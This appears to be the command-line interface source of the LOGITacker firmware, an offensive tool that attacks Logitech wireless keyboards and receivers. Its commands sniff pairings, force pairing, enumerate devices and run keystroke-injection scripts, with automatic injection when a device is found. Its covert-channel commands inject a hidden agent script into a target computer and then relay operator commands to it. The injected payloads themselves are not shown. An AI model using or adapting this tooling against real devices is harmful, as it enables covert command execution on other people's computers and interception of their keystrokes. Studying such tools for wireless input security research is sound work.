    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "passive-enum USB mouse pass-through: %s\r\n", g_logitacker_global_config.passive_enum_pass_through_mouse ? "on" : "off");
}

static void cmd_options_discover_pass_raw(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.discover_pass_through_hidraw = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.discover_pass_through_hidraw = true;

    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "discover raw USB pass-through: %s\r\n", g_logitacker_global_config.discover_pass_through_hidraw ? "on" : "off");
}

static void cmd_options_passiveenum_pass_raw(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.passive_enum_pass_through_hidraw = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.passive_enum_pass_through_hidraw = true;

    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "passive-enum raw USB pass-through: %s\r\n", g_logitacker_global_config.passive_enum_pass_through_hidraw ? "on" : "off");
}

static void cmd_enum_passive(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting passive enumeration for device %s\r\n", tmp_addr_str);
        logitacker_enter_mode_passive_enum(addr);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
    }
}

#ifdef CLI_TEST_COMMANDS
static void cmd_prx(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting PRX with address %s\r\n", tmp_addr_str);
        logitacker_enter_mode_prx(addr);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
    }
}
#endif

static void cmd_enum_active(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting active enumeration for device %s\r\n", tmp_addr_str);
        logitacker_enter_mode_active_enum(addr);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
    }
}


#define MAX_CC_PAY_SIZE 16
bool pre_cmd_callback_covert_channel(nrf_cli_t const * p_cli, char const * const p_cmd_buf) {
    if (strcmp(p_cmd_buf, "!exit") == 0) {
        nrf_cli_register_pre_cmd_callback(p_cli, NULL);
        logitacker_enter_mode_discovery();
        return true;
    }

    covert_channel_payload_data_t tmp_tx_data = {0};

    //push chunks of cmd_buff

    // ToDo: fix client
    //payload size reduzed to 15, because client agent doesn't ack full size payloads


    int pos = 0;
    while (strlen(&p_cmd_buf[pos]) >= MAX_CC_PAY_SIZE) {
        memcpy(tmp_tx_data.data, &p_cmd_buf[pos], MAX_CC_PAY_SIZE);
        tmp_tx_data.len = MAX_CC_PAY_SIZE;

        NRF_LOG_HEXDUMP_DEBUG(tmp_tx_data.data, MAX_CC_PAY_SIZE);
        uint32_t err = logitacker_covert_channel_push_data(&tmp_tx_data);
        if (err != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "error writing covert channel data 0x%08x\r\n", err);
            return true;
        }

        pos += MAX_CC_PAY_SIZE;
    }


    size_t slen = strlen(&p_cmd_buf[pos]);

    memset(tmp_tx_data.data, 0, 16);
    memcpy(tmp_tx_data.data, &p_cmd_buf[pos], slen);
    tmp_tx_data.len = slen + 1;

    //append line break
    tmp_tx_data.data[slen] = '\n';

    NRF_LOG_HEXDUMP_DEBUG(tmp_tx_data.data,tmp_tx_data.len);

    uint32_t err = logitacker_covert_channel_push_data(&tmp_tx_data);
    if (err != NRF_SUCCESS) {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "error writing covert channel data 0x%08x\r\n", err);
    }

    return true;
}


static void cmd_covert_channel_connect(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting covert channel for device %s\r\n", tmp_addr_str);
        logitacker_enter_mode_covert_channel(addr, p_cli);

        nrf_cli_register_pre_cmd_callback(p_cli, &pre_cmd_callback_covert_channel);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "enter '!exit' to return to normal CLI mode\r\n\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "This feature is a PoC in experimental state\r\n");
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "I don't accept issues or requests on it, unless they fly in \r\nas working PR for LOGITacker\r\n");

        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
    }
}

static void cmd_covert_channel_deploy(nrf_cli_t const *p_cli, size_t argc, char **argv) {

    if (argc > 1)
    {
        //nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);

        //parse arg 1 as address
        uint8_t addr[5];
        if (strcmp(argv[1], "USB") == 0) {
            memset(addr,0x00,5);
            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes to USB keyboard interface\r\n");
        } else {
            if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
                nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
                return;
            }

            char tmp_addr_str[16];
            helper_addr_to_hex_str(tmp_addr_str, 5, addr);
            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes using address %s\r\n", tmp_addr_str);
        }

        bool hide = true;
        if (argc > 2 && strcmp(argv[2],"unhide") == 0) hide = false;

        // deploy covert channel agent
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "load covert channel client agent script\r\n");
        deploy_covert_channel_script(hide);
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "inject covert channel client agent into target %s\r\n", argv[1]);

        //logitacker_keyboard_map_test();
        logitacker_enter_mode_injection(addr);
        logitacker_injection_start_execution(true);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "device address needed, format has to be xx:xx:xx:xx:xx\r\n");
        return;
    }
}


#ifdef CLI_TEST_COMMANDS
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_test)
        {
                NRF_CLI_CMD(a, NULL, "test a", cmd_test_a),
                NRF_CLI_CMD(b, NULL, "test b", cmd_test_b),
                NRF_CLI_CMD(c, NULL, "test b", cmd_test_c),
                NRF_CLI_SUBCMD_SET_END
        };
NRF_CLI_CMD_REGISTER(test, &m_sub_test, "Debug command to test code", NULL);

NRF_CLI_CMD_REGISTER(testled, NULL, "Debug command to test code", cmd_testled);
#endif



NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_discover)
{
    NRF_CLI_CMD(run,   NULL, "Enter discover mode.", cmd_discover_run),
    NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(discover, &m_sub_discover, "discover", cmd_discover);

//pair_sniff_run level 3
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_pair_device_addresses, dynamic_device_addr_list_ram);

//pair_sniff level 2
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_pair_sniff)
{
        NRF_CLI_CMD(run, NULL, "Sniff pairing.", cmd_pair_sniff_run),
        NRF_CLI_SUBCMD_SET_END
};

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_pair_device)
{
        NRF_CLI_CMD(run, &m_sub_pair_device_addresses, "Pair device on given address (if no address given, pairing address is used).", cmd_pair_device_run),
        NRF_CLI_SUBCMD_SET_END
};


NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_pair)
{
    NRF_CLI_CMD(sniff, &m_sub_pair_sniff, "Sniff pairing.", cmd_help),
    NRF_CLI_CMD(device, &m_sub_pair_device, "pair or forced pair a device to a dongle", NULL),
    NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(pair, &m_sub_pair, "discover", cmd_pair);

//LEVEL 3
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_dynamic_script_name, dynamic_script_name);

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_script)
{
        NRF_CLI_CMD(clear,   NULL, "clear current script (injection tasks)", cmd_script_clear),
        NRF_CLI_CMD(undo,   NULL, "delete last command from script (last injection task)", cmd_script_undo),
        NRF_CLI_CMD(show,   NULL, "show listing of current script", cmd_script_show),
        NRF_CLI_CMD(string,   NULL, "append 'string' command to script, which types out the text given as parameter", cmd_script_string),
        NRF_CLI_CMD(altstring,   NULL, "append 'altstring' command to script, which types out the text using NUMPAD", cmd_script_altstring),
        NRF_CLI_CMD(press,   NULL, "append 'press' command to script, which creates a key combination from the given parameters", cmd_script_press),
        NRF_CLI_CMD(delay,   NULL, "append 'delay' command to script, delays script execution by the amount of milliseconds given as parameter", cmd_script_delay),
        NRF_CLI_CMD(store,   NULL, "store script to flash", cmd_script_store),
        NRF_CLI_CMD(load,   &m_sub_dynamic_script_name, "load script from flash", cmd_script_load),
        NRF_CLI_CMD(list,   NULL, "list scripts stored on flash", cmd_script_list),
        NRF_CLI_CMD(remove,   &m_sub_dynamic_script_name, "delete script from flash", cmd_script_remove),
        NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(script, &m_sub_script, "scripting for injection", cmd_inject);

//level 2
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_inject_target_addr, dynamic_device_addr_list_ram_with_usb);

// level 1
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_inject)
{
    NRF_CLI_CMD(target, &m_sub_inject_target_addr, "enter injection mode for given target RF address", cmd_inject_target),
    NRF_CLI_CMD(execute,   NULL, "run current script against injection target", cmd_inject_execute),
    NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(inject, &m_sub_inject, "injection", cmd_inject);

//device level 3
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_device_storage_load_list, dynamic_device_addr_list_stored);
//NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_device_store_delete_list, dynamic_device_addr_list_stored_with_all);
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_device_store_delete_list, dynamic_device_addr_list_stored); // don't offer delete all option for flash
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_device_store_save_list, dynamic_device_addr_list_ram);
//device level 2
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_devices_storage)
{
    NRF_CLI_CMD(list, NULL, "list devices stored on flash", cmd_devices_storage_list),
    NRF_CLI_CMD(load, &m_sub_device_storage_load_list, "load a stored device", cmd_devices_storage_load),
    NRF_CLI_CMD(save, &m_sub_device_store_save_list, "store a device to flash", cmd_devices_storage_save),
    NRF_CLI_CMD(remove, &m_sub_device_store_delete_list, "delete a stored device from flash", cmd_devices_storage_remove),
    NRF_CLI_SUBCMD_SET_END
};

NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_devices_remove_addr_collection, dynamic_device_addr_list_ram_with_all);
//devices level 1 (handles auto-complete from level 2 as parameter)
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_devices)
{
        NRF_CLI_CMD(storage, &m_sub_devices_storage, "handle devices on flash", NULL),
        NRF_CLI_CMD(remove, &m_sub_devices_remove_addr_collection, "delete a device from list (RAM)", cmd_devices_remove),
        NRF_CLI_CMD(add, NULL, "manually add a device (RAM)", cmd_devices_add),
        NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(devices, &m_sub_devices, "List discovered devices", cmd_devices);

NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_enum_device_list, dynamic_device_addr_list_ram);

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_covertchannel)
{
        NRF_CLI_CMD(connnect, &m_sub_enum_device_list, "connect to device with deployed covert channel", cmd_covert_channel_connect),
        NRF_CLI_CMD(deploy, &m_sub_enum_device_list, "deploy covert channel agent for given device", cmd_covert_channel_deploy),
        NRF_CLI_SUBCMD_SET_END
};

NRF_CLI_CMD_REGISTER(covert_channel, &m_sub_covertchannel, "start covert channel for given device", NULL);


NRF_CLI_CMD_REGISTER(active_enum, &m_sub_enum_device_list, "start active enumeration of given device", cmd_enum_active);
NRF_CLI_CMD_REGISTER(passive_enum, &m_sub_enum_device_list, "start passive enumeration of given device", cmd_enum_passive);

#ifdef CLI_TEST_COMMANDS
NRF_CLI_CMD_REGISTER(prx, &m_sub_enum_device_list, "start a PRX for the given device address", cmd_prx);
#endif

NRF_CLI_CMD_REGISTER(erase_flash, NULL, "erase all data stored on flash", cmd_erase_flash);

NRF_CLI_CMD_REGISTER(version, NULL, "print version string", cmd_version);

//options

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_on_off)
{
    NRF_CLI_CMD(on, NULL, "enable", NULL),
    NRF_CLI_CMD(off, NULL, "disable", NULL),
    NRF_CLI_SUBCMD_SET_END
};

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject_defaultscript)
{
    NRF_CLI_CMD(clear, NULL, "clear default script", cmd_options_inject_defaultscript_clear),
    NRF_CLI_SUBCMD_SET_END
};

// options passive-enum
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_passiveenum)
{
    NRF_CLI_CMD(pass-through-keyboard, &m_sub_options_on_off, "pass received keyboard reports to LOGITacker's USB keyboard interface", cmd_options_passiveenum_pass_keyboard),
    NRF_CLI_CMD(pass-through-mouse, &m_sub_options_on_off, "pass received mouse reports to LOGITacker's USB mouse interface", cmd_options_passiveenum_pass_mouse),
    NRF_CLI_CMD(pass-through-raw, &m_sub_options_on_off, "pass all received RF reports to LOGITacker's USB hidraw interface", cmd_options_passiveenum_pass_raw),
    NRF_CLI_SUBCMD_SET_END
};

// options discover onhit
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_discover_onhit)
{
    NRF_CLI_CMD(continue,   NULL, "stay in discover mode.", cmd_discover_onhit_continue),
    NRF_CLI_CMD(active-enum, NULL, "enter active enumeration mode", cmd_discover_onhit_activeenum),
    NRF_CLI_CMD(passive-enum, NULL, "enter passive enumeration mode", cmd_discover_onhit_passiveenum),
    NRF_CLI_CMD(auto-inject, NULL, "enter injection mode and execute injection", cmd_discover_onhit_autoinject),
    NRF_CLI_SUBCMD_SET_END
};

// options discover
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_discover)
{
    NRF_CLI_CMD(pass-through-raw, &m_sub_options_on_off, "pass all received promiscuous RF reports to LOGITacker's USB hidraw interface", cmd_options_discover_pass_raw),
    NRF_CLI_CMD(onhit, &m_sub_options_discover_onhit, "select action to take when device a RF address is discovered", cmd_help),
    NRF_CLI_CMD(auto-store-plain-injectable, &m_sub_options_on_off, "automatically store discovered devices to flash if they allow plain injection", cmd_options_discover_autostoreplain),
    NRF_CLI_SUBCMD_SET_END
};

//options pair-sniff onsuccess
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_pairsniff_onsuccess)
{
        NRF_CLI_CMD(continue, NULL, "continue to sniff pairing attempts", cmd_pair_sniff_onsuccess_continue),
        NRF_CLI_CMD(passive-enum, NULL, "start passive enumeration of newly paired device", cmd_pair_sniff_onsuccess_passiveenum),
        NRF_CLI_CMD(active-enum, NULL, "start passive enumeration of newly paired device", cmd_pair_sniff_onsuccess_activeenum),
        NRF_CLI_CMD(discover, NULL, "enter discover mode", cmd_pair_sniff_onsuccess_discover),
        NRF_CLI_CMD(auto-inject, NULL, "enter injection mode and execute injection", cmd_pair_sniff_onsuccess_autoinject),

        NRF_CLI_SUBCMD_SET_END
};


// options pair-sniff
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_pairsniff)
{
    // ToDo: raw pass-through for pair sniff
    //NRF_CLI_CMD(pass-through-raw, &m_sub_options_on_off, "pass all pairing RF reports to LOGITacker's USB hidraw interface (not implemented)", NULL),
    NRF_CLI_CMD(pass-through-raw, NULL, "pass all pairing RF reports to LOGITacker's USB hidraw interface (not implemented)", NULL),
    NRF_CLI_CMD(onsuccess, &m_sub_options_pairsniff_onsuccess, "select action after a successful pairing has been captured", cmd_help),
    NRF_CLI_CMD(auto-store-pair-sniffed-devices, &m_sub_options_on_off, "automatically store devices after pairing has been sniffed successfully", cmd_options_pairsniff_autostoredevice),
    NRF_CLI_SUBCMD_SET_END
};

// options inject onsuccess
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject_onsuccess)
{
    NRF_CLI_CMD(continue,   NULL, "stay in inject mode.", cmd_inject_onsuccess_continue),
    NRF_CLI_CMD(active-enum, NULL, "enter active enumeration", cmd_inject_onsuccess_activeenum),
    NRF_CLI_CMD(passive-enum, NULL, "enter passive enumeration", cmd_inject_onsuccess_passiveenum),
    NRF_CLI_CMD(discover, NULL, "enter discover mode", cmd_inject_onsuccess_discover),
    NRF_CLI_SUBCMD_SET_END
};
// options inject onfail
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject_onfail)
{
    NRF_CLI_CMD(continue,   NULL, "stay in inject mode.", cmd_inject_onfail_continue),
    NRF_CLI_CMD(active-enum, NULL, "enter active enumeration", cmd_inject_onfail_activeenum),
    NRF_CLI_CMD(passive-enum, NULL, "enter passive enumeration", cmd_inject_onfail_passiveenum),
    NRF_CLI_CMD(discover, NULL, "enter discover mode", cmd_inject_onfail_discover),
    NRF_CLI_SUBCMD_SET_END
};

// options inject
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject)
{
    NRF_CLI_CMD(language, NULL, "set injection keyboard language layout", cmd_options_inject_lang),

    NRF_CLI_CMD(default-script, &m_sub_options_inject_defaultscript, "name of inject script which is loaded at boot", cmd_options_inject_defaultscript),
    NRF_CLI_CMD(clear-default-script, NULL, "clear script which should be loaded at boot", cmd_options_inject_defaultscript_clear),
    NRF_CLI_CMD(auto-inject-count,   NULL, "maximum number of auto-injects per device", cmd_options_inject_maxautoinjectsperdevice),

    NRF_CLI_CMD(onsuccess, &m_sub_options_inject_onsuccess, "action after successful injection", cmd_help),
    NRF_CLI_CMD(onfail, &m_sub_options_inject_onfail, "action after failed injection", cmd_help),


    NRF_CLI_SUBCMD_SET_END
};


// options global workmode
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_workmode)
{
    NRF_CLI_CMD(unifying,   NULL, "Unifying compatible workmode.", cmd_option_global_workmode_unifying),
    NRF_CLI_CMD(lightspeed,   NULL, "G-Series LIGHTSPEED workmode.", cmd_option_global_workmode_lightspeed),
    NRF_CLI_CMD(g700,   NULL, "G700/G700s receiver workmode.", cmd_option_global_workmode_g700),
    NRF_CLI_SUBCMD_SET_END
};

// options global usbinjectmode
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_usbinjectmode)
{
    NRF_CLI_CMD(powerup,   NULL, "Start USB injection when device is powered on (not accurate, but on every OS).", cmd_option_global_usbinjecttrigger_onpowerup),
    NRF_CLI_CMD(ledupdate,   NULL, "Start USB injection when device receives a keyboard LED report (accurate, not on every OS) ", cmd_option_global_usbinjecttrigger_onledupdate),
    NRF_CLI_SUBCMD_SET_END
};

// options global workmode
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_bootmode)
{
    NRF_CLI_CMD(discover,   NULL, "Boot in 'discover' mode.", cmd_option_global_bootmode_discover),
    NRF_CLI_CMD(usbinject,   NULL, "Boot in 'USB key stroke injection' mode.", cmd_option_global_bootmode_usbinject),
    NRF_CLI_SUBCMD_SET_END
};

// options global
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global)
{
    NRF_CLI_CMD(workmode, &m_sub_options_global_workmode, "LOGITacker working mode", cmd_help),
    NRF_CLI_CMD(bootmode, &m_sub_options_global_bootmode, "LOGITacker boot mode", cmd_help),
    NRF_CLI_CMD(usbtrigger, &m_sub_options_global_usbinjectmode, "When to trigger USB injection", cmd_help),

    NRF_CLI_SUBCMD_SET_END
};

// options
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options)
{
    NRF_CLI_CMD(show, NULL, "print current options", cmd_options_show),
    NRF_CLI_CMD(store,   NULL, "store current options to flash (persist reboot)", cmd_options_store),
    NRF_CLI_CMD(erase,   NULL, "erase options from flash (defaults after reboot)", cmd_options_erase),

    NRF_CLI_CMD(passive-enum, &m_sub_options_passiveenum, "options for passive-enum mode", cmd_help),

    NRF_CLI_CMD(discover, &m_sub_options_discover, "options for discover mode", cmd_help),

    NRF_CLI_CMD(pair-sniff, &m_sub_options_pairsniff, "options for pair sniff mode", cmd_help),

    NRF_CLI_CMD(inject, &m_sub_options_inject, "options for inject mode", cmd_help),

    NRF_CLI_CMD(global, &m_sub_options_global, "global options", cmd_help),


    //NRF_CLI_CMD(pass-keyboard,   NULL, "pass-through keystrokes to USB keyboard", cmd_options_passiveenum_pass_keyboard),
    //NRF_CLI_CMD(pass-mouse,   NULL, "pass-through mouse moves to USB mouse", cmd_options_passiveenum_pass_mouse),

    NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(options, &m_sub_options, "options", cmd_help);
